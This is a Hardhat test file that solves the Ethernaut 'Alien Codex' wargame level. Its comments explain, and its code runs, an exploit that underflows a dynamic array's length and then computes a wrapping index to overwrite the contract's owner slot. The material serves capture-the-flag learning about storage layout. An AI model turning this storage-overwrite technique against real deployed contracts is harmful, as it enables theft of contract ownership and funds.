// # Ethernaut 19: Alien Codex

import {ethers} from 'hardhat'
import {BigNumber, Contract, providers, Signer} from 'ethers'
import {TransactionResponse} from '@ethersproject/providers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272'
const INSTANCE_ADDRESS = '0xe3fB9A42a39326071d1F184C4fb5aA31EDD271C1'

const CODEX_SLOT = 1
const UINT256_ONE = '0x0000000000000000000000000000000000000000000000000000000000000001'

describe('19 Alien Codex', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('AlienCodex', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  // Before we are permitted to call any of the instance's other functions,
  // the `contact` flag needs to be set. Conveniently, there's a public function
  // which does just that.
  it('sets the contacted flag', async () => {
    await instance.make_contact()
    return expect(instance.contact()).to.eventually.be.true
  })

  // Since `bytes32[] public codex` is a dynamic array, its storage slot (1) holds
  // its current length, which initially is zero. `retract` lets us subtract one from
  // the array length, which then underflows to `MaxUint256`.
  //
  // This opens up the instance's entire memory for writing using `revise` with
  // an arbitrary (`0..MaxUint256`) array index.
  //
  // Note that contracts cannot directly set a dynamic array's length property anymore
  // since Solidity 0.6.0. That's why 0.5.0 was used for this level.
  it('retracts on empty array to set array length to MaxUint256', async () => {
    const tx = await instance.retract()
    await tx.wait()
    expect(await provider.getStorageAt(instance.address, CODEX_SLOT)).to.eq(
      ethers.constants.MaxUint256
    )
  })

  // Next we need to know where the `owner` variable is located relative to where
  // the values of `bytes32[] public codex` are stored in memory.
  //
  // `AlienCodex` extends `Ownable` and therefore has `owner` at storage slot 0.
  // (Both `owner` and `contact` are packed into slot 0, leaving the array at slot 1.)
  //
  // The memory address of the dynamic array's *values* is equal to the keccak256 hash
  // of its storage slot number (1). (This is how dynamic array locations are
  // calculated, see e.g. [here](https://docs.soliditylang.org/en/v0.8.6/internals/layout_in_storage.html#mappings-and-dynamic-arrays).)
  //
  // Since `owner` is at 0, we subtract the address of `codex` from 0 to get the
  // array index of `owner`. Knowing `owner` is at `codex[ownerIndex]`, we can overwrite
  // it using `revise`.
  it('calculates array index of owner slot and overwrites it with signer address', async () => {
    const arrayBase = ethers.utils.keccak256(UINT256_ONE)
    const ownerIndex = ethers.constants.MaxUint256.add(1).sub(arrayBase)
    const signerUint256 = '0x' + ''.padStart(24, '0') + signerAddress.slice(2)
    const tx = await instance.revise(ownerIndex, signerUint256)
    return expectStatusOK(tx)
  })

  it('verifies signer has become owner', async () => {
    expect(await instance.owner()).to.eq(signerAddress)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
